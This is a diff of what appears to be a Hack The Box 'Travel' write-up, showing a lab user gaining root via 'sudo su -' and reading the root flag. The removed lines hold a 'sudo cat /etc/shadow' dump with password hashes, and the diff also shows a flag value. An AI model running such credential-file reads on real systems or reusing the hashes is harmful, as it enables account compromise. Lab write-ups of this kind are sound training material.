+  Usage of /:                       46.0% of 15.68GB
+  Memory usage:                     11%
+  Swap usage:                       0%
+  Processes:                        197
+  Users logged in:                  1
+  IPv4 address for br-836575a2ebbb: 172.20.0.1
+  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.10.189
 
-System load: 0.06 Usage of /: 46.0% of 15.68GB Memory usage: 11% Swap usage: 0% Processes: 197 Users logged in: 1 IPv4 address for br-836575a2ebbb: 172.20.0.1 IPv4 address for br-8ec6dcae5ba1: 172.30.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.10.189
+Last login: Sat Sep 19 16:12:03 2020 from 10.10.15.53
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
 
-Last login: Sat Sep 19 16:12:03 2020 from 10.10.15.53 To run a command as administrator \(user "root"\), use "sudo ". See "man sudo\_root" for details.
+lynik@travel:~$ id
+uid=5000(lynik) gid=27(sudo) groups=27(sudo),5000(domainusers)
 
-lynik@travel:~$ id uid=5000\(lynik\) gid=27\(sudo\) groups=27\(sudo\),5000\(domainusers\)
-
-```text
+```
 ### Getting a shell
 
 after adding this user to the sudoers group:
 ```
+lynik@travel:~$ sudo -l
+[sudo] password for lynik: 
+Matching Defaults entries for lynik on travel:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-lynik@travel:~$ sudo -l \[sudo\] password for lynik: Matching Defaults entries for lynik on travel: env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User lynik may run the following commands on travel: \(ALL : ALL\) ALL lynik@travel:~$ sudo su - root@travel:~\# cat root.txt 550099de4950e4d03a939943ad265eb0
-
-```text
+User lynik may run the following commands on travel:
+    (ALL : ALL) ALL
+lynik@travel:~$ sudo su -
+root@travel:~# cat root.txt 
+550099de4950e4d03a939943ad265eb0
+```
 ### Root.txt
 
-NOT PART OF WRITEUP
-```
 
-lynik@travel:/var$ sudo cat /etc/shadow root:$6$p6a8fCN5/L4rm3FA$bwV15SC9j7QwaRwolnptinKydaRp9O3826E8QlFyrVmjxoaIvs6A.Aw7Z/VCRgGXu0cjLYfmznespEhTS8ZUe/:18397:0:99999:7::: daemon:_:18375:0:99999:7::: bin:_:18375:0:99999:7::: sys:_:18375:0:99999:7::: sync:_:18375:0:99999:7::: games:_:18375:0:99999:7::: man:_:18375:0:99999:7::: lp:_:18375:0:99999:7::: mail:_:18375:0:99999:7::: news:_:18375:0:99999:7::: uucp:_:18375:0:99999:7::: proxy:_:18375:0:99999:7::: www-data:_:18375:0:99999:7::: backup:_:18375:0:99999:7::: list:_:18375:0:99999:7::: irc:_:18375:0:99999:7::: gnats:_:18375:0:99999:7::: nobody:_:18375:0:99999:7::: systemd-network:_:18375:0:99999:7::: systemd-resolve:_:18375:0:99999:7::: systemd-timesync:_:18375:0:99999:7::: messagebus:_:18375:0:99999:7::: syslog:_:18375:0:99999:7::: \_apt:_:18375:0:99999:7::: tss:_:18375:0:99999:7::: uuidd:_:18375:0:99999:7::: tcpdump:_:18375:0:99999:7::: landscape:_:18375:0:99999:7::: pollinate:_:18375:0:99999:7::: sshd:_:18375:0:99999:7::: systemd-coredump:!!:18375:::::: trvl-admin:$6$bUFYK4oYT.zHHNS0$dphmYazflDpzFBhBjs47RuX1E1gLoGbM1cpIHKTelSGLL0Om5suPH6Sp7gyFGxq21R/YfqoOu5WNf8y5IoKsx.:18375:0:99999:7::: lxd:!:18375:::::: lynik-admin:$6$uCqqXDwiD4ZkQXYX$umY1zXMfcaWTgiNcvGrqO9DQSysYAZWp.VVLr2aj/lssN67EPiENanfCFgZBSsEakZNmF4E1kz6VaKft2gXNX.:18376:0:99999:7::: dnsmasq:_:18375:0:99999:7::: sssd:\*:18375:0:99999:7:::
-
-\`\`\`
 
 Thanks to xct [`xct`](https://www.hackthebox.eu/home/users/profile/13569) & [`jkr`](https://www.hackthebox.eu/home/users/profile/77141) for something interesting or useful about this machine.
 
